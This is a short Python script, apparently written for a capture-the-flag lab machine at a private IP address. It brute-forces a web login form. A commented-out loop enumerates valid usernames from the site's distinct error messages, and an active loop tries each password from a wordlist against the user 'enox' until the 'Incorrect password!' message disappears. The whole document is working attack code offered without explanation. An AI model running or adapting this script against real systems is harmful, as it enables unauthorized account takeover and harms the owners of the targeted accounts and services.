import requests

url = "http://10.10.228.48/sUp3r-s3cr3t/authenticate.php"

def login(username, password):
	r = requests.post(url,data = {
		"username":username,
		"password":password,
		"submit":"Login"
		})
	return r
file1 = open('userid', 'r') 
Lines = file1.readlines() 
print(Lines)
# For username:

# for elem in Lines:
# 	print(elem[0:len(elem) - 1])
# 	text = login(elem[0:len(elem) - 1], "pass").text
# 	if "Incorrect username!" not in text:
# 		print(elem)
# print(login("Anshul", "Bahrani").text)

# For password:

file2 = open("credentials.txt", "r")
Lines2 = file2.readlines()

for elem in Lines2:
	print(elem)
	text = login("enox", elem[0:len(elem) - 1]).text
	if "Incorrect password!" not in text:
		print(elem)
		break